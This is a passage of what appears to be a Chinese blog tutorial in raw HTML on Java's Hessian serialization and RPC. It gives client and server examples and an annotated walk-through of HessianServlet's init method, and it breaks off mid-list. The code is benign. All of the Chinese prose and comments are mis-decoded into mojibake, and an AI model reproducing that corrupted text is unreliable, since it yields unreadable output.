<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å†™</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(bos);</span><br><span class="line">out.writeObject(<span class="keyword">new</span> <span class="title class_">YourDTO</span>(...));</span><br><span class="line">out.flush();</span><br><span class="line"><span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»</span></span><br><span class="line"><span class="type">Hessian2Input</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line"><span class="type">Object</span> <span class="variable">back</span> <span class="operator">=</span> in.readObject();</span><br></pre></td></tr></table></figure></div>

<h3 id="è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRPCï¼‰"><a href="#è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRPCï¼‰" class="headerlink" title="è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRPCï¼‰"></a>è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRPCï¼‰</h3><p>å› ä¸º Hessian æ˜¯ä¸€ä¸ª RPC åè®®æ¡†æ¶ï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆéœ€è¦å®šä¹‰ä¸€ä¸ªéœ€è¦è¢«è¿œç¨‹è°ƒç”¨çš„æ¥å£ç±»ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é€šç”¨ APIï¼šæœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯å…±ç”¨</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line">    String <span class="title function_">hi</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸºäº-Servlet-çš„æœåŠ¡ç«¯"><a href="#åŸºäº-Servlet-çš„æœåŠ¡ç«¯" class="headerlink" title="åŸºäº Servlet çš„æœåŠ¡ç«¯"></a>åŸºäº Servlet çš„æœåŠ¡ç«¯</h4><p>ç¼–å†™ä¸€ä¸ª <code>HttpServlet</code>ï¼Œç»§æ‰¿ Hessian æä¾›çš„ <code>HessianServlet</code>ï¼Œå¹¶<strong>ç›´æ¥å®ç°ä¸šåŠ¡æ¥å£</strong>ã€‚æœ€åæŠŠå®ƒæ˜ å°„åˆ°ä¸€ä¸ª URL å³å¯ã€‚</p>
<blockquote>
<p>è¿™é‡Œ <code>HessianServlet</code> è´Ÿè´£è¯»å–&#x2F;å†™å› Hessian äºŒè¿›åˆ¶æµå¹¶åˆ†æ´¾åˆ°ä½ çš„æ–¹æ³•å®ç°ã€‚</p>
</blockquote>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¦‚æœæ˜¯ Jakarta EE 9+ / Servlet 5+:</span></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebServlet;</span><br><span class="line"><span class="comment">// æ—§ç‰ˆï¼ˆJava EE / Servlet 3.x-4.xï¼‰æŠŠä¸Šé¢ä¸€è¡Œæ”¹æˆï¼š</span></span><br><span class="line"><span class="comment">// import javax.servlet.annotation.WebServlet;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.server.HessianServlet;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(urlPatterns = &quot;/hessian/hello&quot;, loadOnStartup = 1)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceServlet</span> <span class="keyword">extends</span> <span class="title class_">HessianServlet</span> <span class="keyword">implements</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hi</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸºäº-Spring-çš„æœåŠ¡ç«¯"><a href="#åŸºäº-Spring-çš„æœåŠ¡ç«¯" class="headerlink" title="åŸºäº Spring çš„æœåŠ¡ç«¯"></a>åŸºäº Spring çš„æœåŠ¡ç«¯</h4><p>åˆ©ç”¨ <code>HessianServiceExporter</code> æŠŠä»»æ„ Spring Bean æš´éœ²æˆ Hessian ç«¯ç‚¹ã€‚Spring MVC é‡Œ<strong>ä»¥ bean name ä½œä¸º URL æ˜ å°„</strong>ï¼ˆä»¥ <code>/</code> å¼€å¤´ï¼‰ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ çš„ä¸šåŠ¡å®ç°</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">HelloService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hi</span><span class="params">(String name)</span> &#123; <span class="keyword">return</span> <span class="string">&quot;Hello, &quot;</span> + name; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java Configï¼ˆSpring 5/Boot 2.x å¯ç”¨ï¼‰</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianServerConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean(name = &quot;/hessian/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> org.springframework.remoting.caucho.HessianServiceExporter <span class="title function_">helloExporter</span><span class="params">(HelloService helloService)</span> &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">exporter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">org</span>.springframework.remoting.caucho.HessianServiceExporter();</span><br><span class="line">        exporter.setService(helloService);</span><br><span class="line">        exporter.setServiceInterface(HelloService.class);</span><br><span class="line">        <span class="keyword">return</span> exporter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>ä¸Šè¿°åšæ³•æ¥è‡ª Spring çš„ Remoting æ”¯æŒï¼š<code>HessianServiceExporter</code> é€šè¿‡ HTTP æŠŠæ¥å£æš´éœ²å‡ºå»ï¼Œå®¢æˆ·ç«¯ä»¥ Hessian åè®®è®¿é—®è¯¥ URLã€‚åŸºäº Spring 5 åŠæ›´æ—©ç‰ˆæœ¬ï¼ŒSpring 6+ å·²åˆ é™¤ <code>HessianServiceExporter</code>&#x2F;<code>HessianProxyFactoryBean</code> ç­‰ Remoting APIã€‚</p>
</blockquote>
<h4 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;</span><br><span class="line"></span><br><span class="line"><span class="type">HessianProxyFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianProxyFactory</span>();</span><br><span class="line"><span class="comment">// å¦‚éœ€ Hessian 2 åè®®ï¼šfactory.setHessian2Request(true); factory.setHessian2Reply(true);</span></span><br><span class="line"><span class="type">HelloService</span> <span class="variable">hello</span> <span class="operator">=</span> (HelloService) factory.create(</span><br><span class="line">        HelloService.class, <span class="string">&quot;http://localhost:8080/yourapp/hessian/hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(hello.hi(<span class="string">&quot;world&quot;</span>));</span><br></pre></td></tr></table></figure></div>

<h2 id="æºç åˆ†æ-1"><a href="#æºç åˆ†æ-1" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><h3 id="æœåŠ¡ç«¯"><a href="#æœåŠ¡ç«¯" class="headerlink" title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h3><h4 id="åˆå§‹åŒ–è¿‡ç¨‹"><a href="#åˆå§‹åŒ–è¿‡ç¨‹" class="headerlink" title="åˆå§‹åŒ–è¿‡ç¨‹"></a>åˆå§‹åŒ–è¿‡ç¨‹</h4><p><code>com.caucho.hessian.server.HessianServlet</code> ç»§æ‰¿äº <code>HttpServlet</code>ï¼Œå› æ­¤æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª Servletï¼Œä¹Ÿå°±æ‹¥æœ‰ Servlet çš„ç”Ÿå‘½å‘¨æœŸã€‚</p>
<p>åœ¨ <code>HessianServlet</code> çš„åˆå§‹åŒ–é˜¶æ®µä¼šè°ƒç”¨å®ƒçš„ <code>init</code> å‡½æ•°ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆå§‹åŒ–æœåŠ¡ï¼ˆåŒ…æ‹¬â€œhome æœåŠ¡å¯¹è±¡â€å’Œå¯é€‰çš„â€œobject å¯¹è±¡â€ï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> * è¯»å– Servlet çš„ init-paramï¼ˆweb.xml æˆ–æ³¨è§£ç­‰ï¼‰æ¥å†³å®šå®ç°ç±»å’Œæ¥å£ç±»ï¼Œ</span></span><br><span class="line"><span class="comment"> * ç„¶åæ„é€ å¯¹åº”çš„ HessianSkeleton ä»¥å¤„ç†è¿œç¨‹è°ƒç”¨ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    <span class="comment">// å…ˆè°ƒç”¨çˆ¶ç±»åˆå§‹åŒ–</span></span><br><span class="line">    <span class="built_in">super</span>.init(config);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ===================== 1) å†³å®š home å®ç°å¯¹è±¡ï¼ˆ_homeImplï¼‰ =====================</span></span><br><span class="line">        <span class="keyword">if</span> (_homeImpl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœå¤–éƒ¨å·²ç»æå‰æ³¨å…¥/è®¾ç½®äº† _homeImplï¼Œåˆ™ç›´æ¥ä½¿ç”¨</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getInitParameter(<span class="string">&quot;home-class&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// æ–¹å¼ Aï¼šé€šè¿‡ init-param &quot;home-class&quot; æŒ‡å®š home å®ç°ç±»</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> getInitParameter(<span class="string">&quot;home-class&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; homeClass = loadClass(className);</span><br><span class="line">            _homeImpl = homeClass.newInstance();</span><br><span class="line">            init(_homeImpl); <span class="comment">// å›è°ƒå¯é€‰çš„ Bean åˆå§‹åŒ–</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getInitParameter(<span class="string">&quot;service-class&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// æ–¹å¼ Bï¼šå…¼å®¹ç”¨æ³•ï¼Œ&quot;service-class&quot; ä¹Ÿæ˜¯ home å®ç°ç±»</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> getInitParameter(<span class="string">&quot;service-class&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; homeClass = loadClass(className);</span><br><span class="line">            _homeImpl = homeClass.newInstance();</span><br><span class="line">            init(_homeImpl);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// æœªæ˜¾å¼æä¾›å®ç°ç±»æ—¶ï¼š</span></span><br><span class="line">            <span class="comment">// è‹¥å½“å‰ç±»å°±æ˜¯ HessianServlet æœ¬ä½“ï¼ˆè€Œä¸æ˜¯å­ç±»ï¼‰ï¼Œåˆ™æŠ¥é”™ï¼›</span></span><br><span class="line">            <span class="comment">// å¦åˆ™è®¤ä¸ºâ€œå½“å‰ Servlet å­ç±»æœ¬èº«â€å°±æ˜¯ home çš„å®ç°ã€‚</span></span><br><span class="line">            <span class="keyword">if</span> (getClass().equals(HessianServlet.class)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;server must extend HessianServlet&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            _homeImpl = <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ===================== 2) å†³å®š home API æ¥å£ç±»å‹ï¼ˆ_homeAPIï¼‰ =====================</span></span><br><span class="line">        <span class="keyword">if</span> (_homeAPI != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// å·²ç»å¤–éƒ¨è®¾ç½®è¿‡æ¥å£ç±»å‹</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getInitParameter(<span class="string">&quot;home-api&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// æ–¹å¼ Aï¼šé€šè¿‡ init-param &quot;home-api&quot; æŒ‡å®šæ¥å£ç±»</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> getInitParameter(<span class="string">&quot;home-api&quot;</span>);</span><br><span class="line">            _homeAPI = loadClass(className);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getInitParameter(<span class="string">&quot;api-class&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// æ–¹å¼ Bï¼šå…¼å®¹ç”¨æ³•ï¼Œ&quot;api-class&quot; ä¹Ÿæ˜¯æ¥å£ç±»</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> getInitParameter(<span class="string">&quot;api-class&quot;</span>);</span><br><span class="line">            _homeAPI = loadClass(className);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (_homeImpl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// æœªæ˜¾å¼æä¾›æ—¶ï¼Œå°è¯•æ ¹æ®å®ç°ç±»è‡ªåŠ¨å¯»æ‰¾è¿œç¨‹æ¥å£</span></span><br><span class="line">            _homeAPI = findRemoteAPI(_homeImpl.getClass());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_homeAPI == <span class="literal">null</span>) &#123;</span><br><span class="line">                _homeAPI = _homeImpl.getClass();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ³¨æ„ï¼šåŸå§‹ä»£ç è¿™é‡Œå†æ¬¡å¼ºåˆ¶èµ‹å€¼ä¸ºå®ç°ç±»ï¼Œ</span></span><br><span class="line">            <span class="comment">// ä¼šè¦†ç›–ä¸Šé¢ findRemoteAPI() çš„ç»“æœï¼ˆå³æœ€ç»ˆ _homeAPI = å®ç°ç±»ï¼‰</span></span><br><span class="line">            _homeAPI = _homeImpl.getClass();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ===================== 3) ï¼ˆå¯é€‰ï¼‰å†³å®š object å®ç°å¯¹è±¡ï¼ˆ_objectImplï¼‰ =====================</span></span><br><span class="line">        <span class="keyword">if</span> (_objectImpl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// å·²æ³¨å…¥åˆ™ä½¿ç”¨</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getInitParameter(<span class="string">&quot;object-class&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// é€šè¿‡ &quot;object-class&quot; æŒ‡å®šå¯¹è±¡å®ç°ç±»</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> getInitParameter(<span class="string">&quot;object-class&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; objectClass = loadClass(className);</span><br><span class="line">            _objectImpl = objectClass.newInstance();</span><br><span class="line">            init(_objectImpl);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ===================== 4) ï¼ˆå¯é€‰ï¼‰å†³å®š object API æ¥å£ï¼ˆ_objectAPIï¼‰ =====================</span></span><br><span class="line">        <span class="keyword">if</span> (_objectAPI != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// å·²æ³¨å…¥åˆ™ä½¿ç”¨</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getInitParameter(<span class="string">&quot;object-api&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// é€šè¿‡ &quot;object-api&quot; æŒ‡å®šæ¥å£ç±»</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> getInitParameter(<span class="string">&quot;object-api&quot;</span>);</span><br><span class="line">            _objectAPI = loadClass(className);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (_objectImpl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// æœªæ˜¾å¼æä¾›æ—¶ï¼Œé»˜è®¤æŠŠå®ç°ç±»å½“ä½œæ¥å£ç±»å‹</span></span><br><span class="line">            _objectAPI = _objectImpl.getClass();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ===================== 5) æ„é€  Skeletonï¼ˆæ–¹æ³•åˆ†æ´¾å™¨ï¼‰ =====================</span></span><br><span class="line">        <span class="comment">// home skeleton ç”¨äºåˆ†æ´¾å¯¹ home æ¥å£çš„è°ƒç”¨</span></span><br><span class="line">        _homeSkeleton = <span class="keyword">new</span> <span class="title class_">HessianSkeleton</span>(_homeImpl, _homeAPI);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœæä¾›äº† object APIï¼Œå‘Šè¯‰ home skeleton å…¶â€œå¯¹è±¡ç±»â€</span></span><br><span class="line">        <span class="keyword">if</span> (_objectAPI != <span class="literal">null</span>) &#123;</span><br><span class="line">            _homeSkeleton.setObjectClass(_objectAPI);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœå­˜åœ¨â€œå¯¹è±¡å®ç°â€ï¼Œåˆ™å•ç‹¬ä¸º object æ„é€  skeletonï¼Œå¹¶å‘Šè¯‰å®ƒ home çš„æ¥å£ç±»</span></span><br><span class="line">        <span class="keyword">if</span> (_objectImpl != <span class="literal">null</span>) &#123;</span><br><span class="line">            _objectSkeleton = <span class="keyword">new</span> <span class="title class_">HessianSkeleton</span>(_objectImpl, _objectAPI);</span><br><span class="line">            _objectSkeleton.setHomeClass(_homeAPI);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// å¦åˆ™ object skeleton å°±å¤ç”¨ home skeleton</span></span><br><span class="line">            _objectSkeleton = _homeSkeleton;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ===================== 6) å¤„ç†å¯é€‰çš„è°ƒè¯•ä¸é›†åˆç±»å‹å¼€å…³ =====================</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equals(getInitParameter(<span class="string">&quot;debug&quot;</span>))) &#123;</span><br><span class="line">            <span class="comment">// è¿™é‡ŒåŸä»£ç ä¸ºç©ºï¼›ä¸€äº›å®ç°ä¼šåœ¨æ­¤æ‰“å¼€è°ƒè¯•æ—¥å¿—</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;false&quot;</span>.equals(getInitParameter(<span class="string">&quot;send-collection-type&quot;</span>))) &#123;</span><br><span class="line">            <span class="comment">// æ˜¯å¦åœ¨åºåˆ—åŒ–é›†åˆæ—¶å‘é€å…·ä½“çš„é›†åˆç±»å‹ä¿¡æ¯ï¼Œfalse åˆ™æ›´é€šç”¨ä½†å¯èƒ½ä¸¢å¤±å®ç°ç±»å‹</span></span><br><span class="line">            setSendCollectionType(<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">        <span class="comment">// ä¿æŒåŸå§‹çš„ ServletException</span></span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// å…¶å®ƒå¼‚å¸¸ç»Ÿä¸€åŒ…è£…ä¸º ServletException æŠ›å‡º</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸€é˜¶æ®µä¼šåˆå§‹åŒ– <code>HessianServlet</code> çš„ä¸€äº›æˆå‘˜å˜é‡ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Class&lt;?&gt; _homeAPI;</span><br><span class="line"><span class="keyword">private</span> Object _homeImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Class&lt;?&gt; _objectAPI;</span><br><span class="line"><span class="keyword">private</span> Object _objectImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> HessianSkeleton _homeSkeleton;</span><br><span class="line"><span class="keyword">private</span> HessianSkeleton _objectSkeleton;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> SerializerFactory _serializerFactory;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><code>_homeAPI</code> &#x2F; <code>_homeImpl</code> â€”â€” <strong>æœåŠ¡ï¼ˆhomeï¼‰æ¥å£ä¸å®ç°</strong></p>
</li>
<li><p><code>_homeImpl</code>ï¼š<strong>æœåŠ¡å®ç°å¯¹è±¡</strong>ï¼ˆ<code>Object</code>ï¼‰ï¼ŒçœŸæ­£æ‰¿æ¥ä¸šåŠ¡æ–¹æ³•è°ƒç”¨ã€‚</p>
<ul>
<li>å¦‚æœé…ç½®äº† <code>home-class</code> æˆ– <code>service-class</code>ï¼Œå°±é€šè¿‡åå°„æ„é€ å®ä¾‹èµ‹ç»™ <code>_homeImpl</code>ï¼›</li>
<li>å¦åˆ™ï¼Œè‹¥å½“å‰ç±»æ˜¯ <code>HessianServlet</code> çš„<strong>å­ç±»</strong>ï¼Œé»˜è®¤æŠŠ <code>_homeImpl = this</code>ï¼ˆå³æŠŠ Servlet è‡ªå·±å½“æˆå®ç°ï¼‰ã€‚</li>
</ul>
</li>
<li><p><code>_homeAPI</code>ï¼šå¯¹å¤–æš´éœ²çš„<strong>æœåŠ¡æ¥å£ç±»å‹</strong>ï¼ˆ<code>Class&lt;?&gt;</code>ï¼‰ã€‚ä¸ä¸€å®šéå¾—æ˜¯æ¥å£ï¼Œä½†<em>æœ€å¥½</em>æ˜¯ä½ çš„ <code>HelloService</code> è¿™ç±»æ¥å£ã€‚ </p>
<ul>
<li><code>_homeAPI</code> è¢«<strong>å¼ºåˆ¶è®¾æˆ</strong> <code>_homeImpl.getClass()</code>ã€‚</li>
</ul>
</li>
<li><p><code>_homeSkeleton</code>ï¼šæ ¹æ®è·å¾—çš„ <code>_homeImpl</code> å’Œ <code>_homeAPI</code> </p>
<ul>
<li>åˆ›å»º <code>_homeSkeleton = new HessianSkeleton(_homeImpl, _homeAPI)</code>ï¼›</li>
<li><code>_homeSkeleton.setObjectClass(_objectAPI)</code>ï¼ˆhome çŸ¥é“å¯¹è±¡ç±»ï¼‰ï¼›</li>
<li>è¯·æ±‚è¿›å…¥ <code>service()</code> æ—¶å¦‚æœ<strong>æ²¡æœ‰</strong> <code>objectId</code> å‚æ•°ï¼Œä¼šèµ° <code>_homeSkeleton.invoke(...)</code> å®Œæˆè°ƒç”¨åˆ†å‘ã€‚</li>
</ul>
</li>
<li><p><code>_objectAPI</code> &#x2F; <code>_objectImpl</code> â€”â€” <strong>å¯¹è±¡ï¼ˆobjectï¼‰æ¥å£ä¸å®ç°ï¼ˆå¯é€‰ï¼‰</strong></p>
